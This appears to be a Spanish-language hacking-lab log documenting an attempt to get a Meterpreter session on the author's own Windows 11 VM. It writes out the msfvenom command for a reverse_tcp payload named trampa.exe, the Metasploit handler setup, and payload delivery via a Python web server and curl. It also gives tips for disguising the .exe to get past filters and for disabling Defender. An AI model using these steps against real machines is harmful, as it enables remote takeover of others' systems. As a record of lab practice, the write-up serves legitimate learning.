@@ -1,0 +1,185 @@
+===============================================================================
+ PRUEBA 3 - PRUEBA DE SCRIPTING EN LABORATORIO DE HACKING (VM)
+ Payload con msfvenom + Meterpreter contra VM Windows 11 propia
+===============================================================================
+Fecha de la sesion : 2026-10-04 (21:00 - 22:10 aprox)
+Documentado        : 2026-10-05
+Continuacion de    : prueba2 (reconocimiento de la misma VM Windows 192.168.1.22)
+Tema               : scripting ofensivo basico / generacion de payload / post-explotacion
+Marco              : laboratorio controlado, todas las maquinas son PROPIAS y aisladas.
+                     Solo se practica sobre equipos propios y con permiso. Fin educativo.
+
+-------------------------------------------------------------------------------
+0. ESCENARIO (quien es quien)
+-------------------------------------------------------------------------------
+Atacante (host) : BlackArch
+                  - enp8s0 (cable) -> 192.168.1.20   <== se uso como LHOST
+                  - wlp9s0 (wifi)  -> 192.168.1.19
+Victima (VM)    : Windows 11
+                  - IP 192.168.1.22
+                  - MAC 08:00:27:EE:D0:DD (Oracle VirtualBox virtual NIC)
+                  - Adaptador: Bridged sobre enp8s0
+Otras VMs       : kali-linux-2026.2, Arch (registradas, no usadas hoy)
+Red             : 192.168.1.0/24
+
+-------------------------------------------------------------------------------
+1. CONCEPTO APRENDIDO ANTES DE TOCAR NADA
+-------------------------------------------------------------------------------
+MITO: "mando un .txt/.exe y se ejecuta solo en la otra maquina".
+REALIDAD: una maquina solo ejecuta codigo externo si:
+  (a) hay un SERVICIO escuchando que te deja entrar + credenciales (ej. SSH/RDP), o
+  (b) hay una VULNERABILIDAD que explotas, o el usuario ejecuta el payload el mismo.
+Requisito previo en ambos casos: tiene que haber un puerto/servicio con el que hablar.
+Orden siempre: ENUMERAR primero, ENTRAR despues.
+
+Se eligio "Camino A": generar un payload (msfvenom) + listener (multi/handler) +
+sesion Meterpreter + navegar. El usuario "victima" ejecuta el payload (se simula
+el phishing/descarga en el propio lab).
+
+msfvenom = fabrica el payload (la "bala").
+metasploit multi/handler = recibe la conexion (el "arma").
+reverse_tcp = la VICTIMA llama de vuelta al atacante (atraviesa firewalls, porque
+              las conexiones salientes casi nunca se bloquean). Por eso NO bind_tcp.
+LHOST = IP del ATACANTE (a donde vuelve la llamada). Error #1 de novato: poner la
+        IP de la victima aqui.
+
+-------------------------------------------------------------------------------
+2. OBJETIVO DEL RETO (flag)
+-------------------------------------------------------------------------------
+Crear en la Windows una carpeta "flag" con un .txt (usuario+contrasena inventados),
+p.ej. C:\flag\  o  C:\Users\<user>\Documents\flag\ , como botin CTF a leer tras entrar.
+
+-------------------------------------------------------------------------------
+3. PREPARACION DE LA VICTIMA
+-------------------------------------------------------------------------------
+- Firewall de Windows 11: DESACTIVADO (para bajar la dificultad del lab).
+  Nota: apagar el firewall NO basta; hace falta que haya un servicio escuchando,
+  o que el payload se ejecute en la propia maquina (nuestro caso).
+- Windows Defender: habia que desactivar la "Proteccion en tiempo real".
+  OJO: Windows 11 a veces la reactiva solo tras unos minutos.
+
+-------------------------------------------------------------------------------
+4. GENERACION DEL PAYLOAD (en BlackArch)
+-------------------------------------------------------------------------------
+Comando:
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f exe -o trampa.exe
+
+Desglose:
+  -p windows/x64/meterpreter/reverse_tcp  -> payload: Windows 64-bit, Meterpreter, reverse
+  LHOST=192.168.1.20                      -> IP del atacante (BlackArch, cable)
+  LPORT=4444                              -> puerto de escucha
+  -f exe                                  -> formato ejecutable Windows
+  -o trampa.exe                           -> archivo de salida (nombre cebo)
+
+Salida real:
+  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+  [-] No arch selected, selecting arch: x64 from the payload
+  No encoder specified, outputting raw payload
+  Payload size: 509 bytes
+  Final size of exe file: 7680 bytes
+  Saved as: trampa.exe
+
+Aprendizaje: "No encoder specified, outputting raw payload" -> el payload va a pelo,
+sin ofuscar -> cualquier antivirus lo detecta al instante. Bien para el lab (Defender
+off), pero en real ese "raw" es lo primero que delata un payload.
+
+-------------------------------------------------------------------------------
+5. LISTENER EN METASPLOIT (en BlackArch)
+-------------------------------------------------------------------------------
+Pasos:
+  msfconsole
+  use exploit/multi/handler
+  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  set LHOST 192.168.1.20
+  set LPORT 4444
+  show options        (verificar antes de lanzar)
+  run                 (o exploit)
+
+Salida objetivo:
+  [*] Started reverse TCP handler on 192.168.1.20:4444
+
+ERRORES COMETIDOS Y COMO SE RESOLVIERON:
+  (e1) "use = exploit/multi/handler" -> el "=" sobra.
+       [-] Failed to load module: =
+       FIX: use exploit/multi/handler   (sin "=", modulo pegado con espacio)
+  (e2) "set PLAYLOAD ..." (typo: PLAYLOAD con L de mas).
+       [!] Unknown datastore option: PLAYLOAD. Did you mean PAYLOAD?
+       Efecto: el payload quedo en el DEFAULT generic/shell_reverse_tcp (NO coincidia
+       con trampa.exe). Se detecto leyendo la cabecera de "show options":
+         "Payload options (generic/shell_reverse_tcp):"  <- mal
+       FIX: Ctrl+C, set PAYLOAD windows/x64/meterpreter/reverse_tcp, show options ->
+         "Payload options (windows/x64/meterpreter/reverse_tcp):"  <- bien
+       LECCION: el handler y el payload del .exe deben ser IDENTICOS o la sesion no entra.
+
+-------------------------------------------------------------------------------
+6. ENTREGA DEL PAYLOAD A LA VICTIMA
+-------------------------------------------------------------------------------
+Metodo: mini servidor web en el atacante.
+  cd ~ && python3 -m http.server 8000
+Verificado desde el host: sirve trampa.exe -> HTTP 200, 7680 bytes.
+El server escucha en 0.0.0.0:8000 (todas las interfaces). Sin firewall en el host
+(firewalld inactive, ufw inactive).
+
+Intento desde Edge en la Windows:
+  http://192.168.1.20:8000/trampa.exe
+  -> ERROR: "Vaya... no se puede obtener acceso a esta pagina"
+            "192.168.1.20 tardo demasiado en responder" (TIMEOUT)
+
+Metodos alternativos de transferencia vistos (leccion de EVASION DE FILTROS):
+  - WhatsApp bloquea .exe -> disfrazarlo: comprimir en .zip  (zip trampa.zip trampa.exe)
+    o renombrar a .txt, enviar, y recuperar/renombrar en la victima.
+  - curl integrado de Windows:  curl http://192.168.1.20:8000/trampa.exe -o trampa.exe
+    (no usa el proxy de Edge; sirve para aislar si el fallo era el navegador).
+  - Carpeta compartida de VirtualBox (Devices -> Shared Folders): no usa red.
+
+-------------------------------------------------------------------------------
+7. EJECUCION Y SINTOMA PRINCIPAL
+-------------------------------------------------------------------------------
+El usuario ejecuto trampa.exe en la Windows: "no paso nada" (no entro sesion).
+En el Administrador de tareas aparecieron 5 procesos "trampa" corriendo:
+  - CPU 0% , ~0.4 MB cada uno , RED: 0 Mbps en todos.
+
+INTERPRETACION:
+  - El payload SE EJECUTA -> Windows Defender NO lo esta bloqueando (se descarta AV).
+  - RED a 0 Mbps -> la trampa NO consigue llamar de vuelta a 192.168.1.20:4444.
+    Los procesos quedan colgados intentando conectar (SYN sin respuesta).
+
+-------------------------------------------------------------------------------
+8. DIAGNOSTICO DE RED (la causa raiz)
+-------------------------------------------------------------------------------
+Hechos recogidos en el host:
+  - Server 8000 OK y accesible por 192.168.1.20 desde el propio host.
+  - Sin firewall en el host (firewalld/ufw inactive).
+  - ARP: 192.168.1.22 REACHABLE via enp8s0 (host SI ve a la VM).
+  - Rutas:
+      192.168.1.0/24 dev enp8s0 src 192.168.1.20 metric 100  (gana)
+      192.168.1.0/24 dev wlp9s0 src 192.168.1.19 metric 600
+  - rp_filter = 2 (modo laxo) en enp8s0/wlp9s0.
+  - Ping VM -> host (192.168.1.20): FUNCIONA (ICMP ok).
+  - Test-NetConnection 192.168.1.20 -Port 4444 (en PowerShell de la victima):
+      se queda en "Waiting for response..." -> TcpTestSucceeded = False.
+
+CONCLUSION:
+  El ICMP (ping) pasa pero el TCP VM->host NO completa (ni al 8000 ni al 4444).
+  Sintoma tipico del modo BRIDGED cuando el HOST tiene DOS IPs en la misma subred
+  (192.168.1.20 cable + 192.168.1.19 wifi): el trafico TCP de retorno host<->VM se
+  enreda. Mientras se use puente contra el propio host, el problema se repite.
+
+-------------------------------------------------------------------------------
+9. RESULTADO
+-------------------------------------------------------------------------------
+PARCIAL. Se logro toda la cadena ofensiva (enumeracion, payload, listener, entrega,
+ejecucion del payload en la victima). FALTA la sesion Meterpreter, bloqueada por un
+problema de RED del laboratorio (no de tecnica): el retorno TCP VM->host no llega en
+modo bridged con host de doble IP.
+
+Lo que SI quedo demostrado/aprendido:
+  - Mito "mandar y que se ejecute solo" vs realidad (servicio/vuln/ejecucion).
+  - msfvenom (fabrica) vs handler (receptor); reverse vs bind; LHOST = atacante.
+  - Payload y handler deben coincidir exactamente.
+  - Payload "raw" = detectable; zip/renombrar = evasion de filtros basica.
+  - Leer la salida para depurar (typos PLAYLOAD, cabecera de show options).
+  - Diagnostico de red por capas (ICMP vs TCP, ARP, rutas, rp_filter, proxy).
+
+Siguiente paso en: guion_que_sigue.txt  (montar red Host-Only Kali<->Windows).
+===============================================================================
